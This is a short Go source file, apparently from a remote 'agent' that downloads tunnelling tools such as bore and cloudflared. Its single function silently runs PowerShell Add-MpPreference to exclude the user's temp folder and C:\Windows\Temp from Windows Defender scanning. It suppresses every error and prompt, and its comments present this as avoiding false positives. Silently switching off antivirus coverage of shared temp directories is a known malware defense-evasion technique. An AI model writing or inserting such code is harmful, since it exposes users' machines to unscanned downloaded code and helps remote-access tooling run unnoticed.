// Package defender adds Windows Defender exclusions for the agent's temp files
// so bore and other downloaded binaries are not quarantined as false positives.
package defender

import (
	"os"
	"os/exec"
	"runtime"
)

// AddTempExclusion adds a Windows Defender exclusion for the current user's
// temp directory (where we download bore and cloudflared). Best-effort: returns
// nil on non-Windows systems, and silently fails if Defender isn't reachable
// or we lack privileges.
func AddTempExclusion() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	tempDir := os.TempDir()

	// Two paths: per-user temp + C:\Windows\Temp (used by SYSTEM-owned processes)
	paths := []string{tempDir, `C:\Windows\Temp`}

	for _, p := range paths {
		// Use -NoProfile + -NonInteractive to avoid PowerShell prompts.
		// 2>$null because Add-MpPreference errors noisily when we don't have
		// Defender permissions — that's fine, we'll fall back gracefully.
		cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive",
			"-Command", `try { Add-MpPreference -ExclusionPath '`+p+`' -ErrorAction Stop } catch {}`)
		_ = cmd.Run()
	}
	return nil
}
